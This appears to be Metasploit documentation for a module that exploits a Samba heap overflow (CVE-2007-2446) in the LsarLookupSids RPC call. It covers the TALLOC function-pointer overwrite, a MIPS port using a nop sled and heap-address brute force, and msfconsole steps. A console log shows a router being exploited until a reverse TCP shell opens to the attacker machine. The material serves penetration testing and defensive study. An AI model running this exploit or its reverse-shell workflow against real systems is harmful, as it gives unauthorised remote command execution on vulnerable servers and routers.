## Vulnerable Application

  Samba 3.0.0 through 3.0.25rc3 are vulnerable to multiple heap overflows. This module targets a heap overflow in the LsarLookupSids RPC call (CVE-2007-2446), causing an overflow in the function lsa\_io\_trans_name().

  The exploit uses the heap overflow to overwrite a function pointer contained in the metadata of the TALLOC memory allocator, a technique which only works on Samba versions 3.0.21-3.0.24.

## Verification Steps

  1. Start msfconsole
  2. Do: `use exploit/linux/samba/lsa_transnames_heap`
  3. Do: `show targets` to see the possible targets
  4. Do: `set target #`
  5. Do: `set rhost`
  6. Do: `exploit`

## MIPS port

  This module was ported to exploit the MIPS architecture. After creating a suitable debugging environment using qemu to emulate Samba on a desktop PC the following steps were required:

### MIPS nop generator

  The exploit uses a heap overflow to put a large nop sled in memory to decrease the accuracy needed in the initial redirection of code flow. A nop sled is a large section of contiguous instructions which do nothing. When code flow is redirected to a nop sled it will continue executing the effect-less nops. At the end of the sled the true payload is added and execution will eventually hit this code.

  A nop generator module was created for MIPS by creating a stream of random instructions which create no side-effects e.g. `sll $2, $2, 0`

### Heap address brute force

  The exploit uses a brute force approach to minimize problems with unpredictability in heap layout. The exploit itself is run multiple times, each time targeting a different point in the heap with the change of execution flow. If all goes correctly, the nop sled will be hit and code execution will follow. If the nop sled is missed, the Samba process is likely to crash, which is generally not a problem as a new instance is forked for each incoming connection. In the event of a crash, a new heap address is chosen and exploitation is attempted again.

  When porting the exploit to a new system, the approximate heap layout must be known in order to suitably attempt exploitation across all of the possible heap locations. As the MIPS port targeted a specific router, the heap layout was determined by examining the ranges identified in _/proc/<pid>/maps_

## Scenarios

    msf > use exploit/linux/samba/lsa\_transnames_heap
    msf exploit(lsa\_transnames_heap) > set target 7
    target => 7
    msf exploit(lsa\_transnames_heap) > set rhost 192.168.1.1
    rhost => 192.168.1.1
    msf exploit(lsa\_transnames_heap) > show options

    Module options (exploit/linux/samba/lsa\_transnames_heap):

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOST    192.168.1.1      yes       The target address
       RPORT    445              yes       The SMB service port
       SMBPIPE  LSARPC           yes       The pipe name to use


    Exploit target:

       Id  Name
       --  ----
       7   Linux Heap Brute Force (OpenWRT MIPS)


    msf exploit(lsa\_transnames_heap) > exploit

    [*] Started reverse TCP handler on 192.168.1.3:4444
    [*] 192.168.1.1:445 - Creating nop sled....
    [*] 192.168.1.1:445 - Trying to exploit Samba with address 0x55900000...
    [*] 192.168.1.1:445 - Connecting to the SMB service...
    [*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Calling the vulnerable function...
    [*] 192.168.1.1:445 - Server did not respond, this is expected
    [*] 192.168.1.1:445 - Trying to exploit Samba with address 0x5590f000...
    [*] 192.168.1.1:445 - Connecting to the SMB service...
    [*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Calling the vulnerable function...
    [*] 192.168.1.1:445 - Server did not respond, this is expected

    ...Some intermediate attempts omitted...

    [*] 192.168.1.1:445 - Trying to exploit Samba with address 0x55996000...
    [*] 192.168.1.1:445 - Connecting to the SMB service...
    [*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Calling the vulnerable function...
    [*] 192.168.1.1:445 - Server did not respond, this is expected
    [*] 192.168.1.1:445 - Trying to exploit Samba with address 0x559a5000...
    [*] 192.168.1.1:445 - Connecting to the SMB service...
    [*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\lsarpc] ...
    [*] 192.168.1.1:445 - Calling the vulnerable function...
    [*] Command shell session 1 opened (192.168.1.3:4444 -> 192.168.1.1:4175) at 2016-10-31 14:00:33 +0000

    uname -a
    Linux WNR2200 2.6.15 #1 Mon Dec 23 15:58:24 CST 2013 mips unknown

